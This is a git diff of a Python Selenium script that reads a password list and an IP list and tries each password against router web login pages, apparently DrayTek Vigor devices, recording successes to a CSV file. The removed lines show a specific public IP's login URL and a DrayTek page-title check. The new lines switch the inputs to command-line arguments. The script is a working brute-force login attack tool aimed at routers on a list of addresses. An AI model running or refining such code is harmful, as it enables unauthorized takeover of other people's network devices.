@@ -4,11 +4,10 @@ from selenium.common.exceptions import WebDriverException
 import time,sys,os
 os.system("@echo off")
 os.system("echo Hayde başlayalım.")
-#http://85.105.102.172/weblogin.htm
-passFileName= "passlist.txt" #debug
-ipFileName= "iplist.txt" #debug
-#passFileName= sys.argv[1] #release
-#ipFileName = sys.argv[2] #release
+# passFileName= "passlist.txt" #debug
+# ipFileName= "iplist.txt" #debug
+passFileName= sys.argv[1] #release
+ipFileName = sys.argv[2] #release
 with open(passFileName) as passList: 
     with open(passFileName+'_RESULT.csv', 'a') as resultFile:
         driver = webdriver.Firefox()
@@ -25,9 +24,7 @@ with open(passFileName) as passList:
                         driver.find_element_by_name("sSysPass").send_keys(p)
                         driver.find_element_by_name("btnOk").click()
 
-                        time.sleep(0.300)
-                        status = ("<title>DrayTek  DrayTek Vigor2860 Series</title>" in driver.page_source)
-                        
+                        status = "Login Page" not in driver.title
                         if status:
                             status ="success"
                         else: 
